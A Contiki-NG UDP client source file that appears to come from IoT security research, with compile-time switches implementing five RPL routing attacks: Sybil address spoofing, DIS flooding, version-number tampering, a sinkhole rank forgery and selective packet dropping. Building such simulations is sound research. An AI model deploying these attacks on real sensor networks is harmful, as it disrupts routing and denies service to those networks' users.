#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include <stdint.h>
#include <inttypes.h>
#include "net/ipv6/uip.h"
#include "sys/log.h"
#include "sys/rtimer.h"
#include "net/routing/rpl-lite/rpl.h" // Include RPL headers for accessing rank

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1
#define UDP_CLIENT_PORT    8765
#define UDP_SERVER_PORT    5678

#define SEND_INTERVAL      (10 * CLOCK_SECOND)

#if SFA_ATTACK
static uint8_t SFA_a = 0; // Attack activation flag, default to 0 (inactive)
#endif

#if DFA_ATTACK
uint8_t DFA_on = 0; // Default is inactive
#endif

#if VNA_ATTACK
uint8_t VNA_on = 0; // Default is inactive
#endif

#if SHA_ATTACK
static uint8_t SHA_on = 0; // Default is inactive
#endif


#if SYA_ATTACK
volatile uint8_t SYA_on = 0; // Sybil Attack activation flag
uint8_t fake_id = 0; // Fake ID for the Sybil Attack
#endif


static struct simple_udp_connection udp_conn;
static uint32_t rx_count = 0;

/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "UDP client");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
                const uip_ipaddr_t *sender_addr,
                uint16_t sender_port,
                const uip_ipaddr_t *receiver_addr,
                uint16_t receiver_port,
                const uint8_t *data,
                uint16_t datalen) {
  LOG_INFO("Received response '%.*s' from ", datalen, (char *) data);
  LOG_INFO_6ADDR(sender_addr);

#if LLSEC802154_CONF_ENABLED
  LOG_INFO_(" LLSEC LV:%d", uipbuf_get_attr(UIPBUF_ATTR_LLSEC_LEVEL));
#endif
  LOG_INFO_("\n");
  rx_count++;
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(udp_client_process, ev, data) {
  static struct etimer periodic_timer;
  static struct etimer dfa_timer; // Timer for DFA
  static char str[32];
  uip_ipaddr_t dest_ipaddr;
  static uint32_t tx_count;
  static uint32_t missed_tx_count;

  PROCESS_BEGIN();

  /* Initialize UDP connection */
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);

  etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    if (NETSTACK_ROUTING.node_is_reachable() &&
        NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {

      /* Print statistics every 10th TX */
      if (tx_count % 10 == 0) {
        LOG_INFO("Tx/Rx/MissedTx: %" PRIu32 "/%" PRIu32 "/%" PRIu32 "\n",
                 tx_count, rx_count, missed_tx_count);
      }
#if SYA_ATTACK
      LOG_INFO("SYA_on value: %d\n", SYA_on);
    if (SYA_on == 1) {
    	LOG_INFO("SYA_on attack : %d\n", SYA_on);
      linkaddr_t fladdr;
      memset(&fladdr, 0, sizeof(linkaddr_t));
      for (int i = 0; i < sizeof(uip_lladdr.addr); i += 2) {
        fladdr.u8[i + 1] = fake_id & 0xff;
        fladdr.u8[i] = fake_id >> 8;
      }
      linkaddr_set_node_addr(&fladdr);
      memcpy(&uip_lladdr.addr, &linkaddr_node_addr, sizeof(uip_lladdr.addr));
      uip_create_linklocal_prefix(&UIP_IP_BUF->srcipaddr);
      uip_ds6_set_addr_iid(&UIP_IP_BUF->srcipaddr, &uip_lladdr);

      LOG_INFO("Sybil Attack: Node pretends to be fake ID: 0x%02x\n", fake_id);
    }
#endif

#if DFA_ATTACK
      LOG_INFO("DFA_on value: %d\n", DFA_on);

      if (DFA_on == 1) {
        
        if (etimer_expired(&dfa_timer)) {

          LOG_INFO("DFA: Flooding DIS messages\n");
          rpl_icmp6_dis_output(NULL); // Send DIS message
          etimer_set(&dfa_timer, 5 * CLOCK_SECOND); // Set timer for next DIS
        }
      }
#endif

#if VNA_ATTACK
      LOG_INFO("VNA_on value: %d\n", VNA_on);
      if (VNA_on == 1) {
        LOG_INFO("VNA: Incrementing version number\n");
        rpl_dag_t *dag = rpl_get_any_dag();
        if (dag != NULL) {
          dag->version++; // Increment version number
          LOG_INFO("VNA: New version number = %" PRIu16 "\n", dag->version);
        } else {
          LOG_WARN("VNA: Failed to access RPL DAG\n");
        }
      }
#endif

#if SHA_ATTACK
      LOG_INFO("SHA_on value: %d\n", SHA_on);
      if (SHA_on == 1) {
        // Access RPL DAG and modify its rank
        rpl_dag_t *dag = rpl_get_any_dag();
        if (dag != NULL) {
          dag->rank = 1; // Set rank to 1 (very low)
          LOG_INFO("SHA: Modified rank to 1 on node %" PRIu16 "\n",
                   linkaddr_node_addr.u8[0]);
        } else {
          LOG_WARN("SHA: Failed to access RPL DAG\n");
        }
      }
#endif

#if SFA_ATTACK
      // Check if SFA is active for this node
      if (SFA_a == 1) {
        LOG_INFO("SFA: Dropping packet %" PRIu32 " on node %" PRIu16 "\n",
                 tx_count, linkaddr_node_addr.u8[0]);
        tx_count++;
        etimer_reset(&periodic_timer); // Skip sending this packet
        continue;
      }
#endif

      /* Send to DAG root */
      LOG_INFO("Sending request %" PRIu32 " to ", tx_count);
      LOG_INFO_6ADDR(&dest_ipaddr);
      LOG_INFO_("\n");
      snprintf(str, sizeof(str), "hello %" PRIu32 "", tx_count);
      simple_udp_sendto(&udp_conn, str, strlen(str), &dest_ipaddr);
      tx_count++;
    } else {
      LOG_INFO("Not reachable yet\n");
      if (tx_count > 0) {
        missed_tx_count++;
      }
    }

    /* Add some jitter */
    etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/

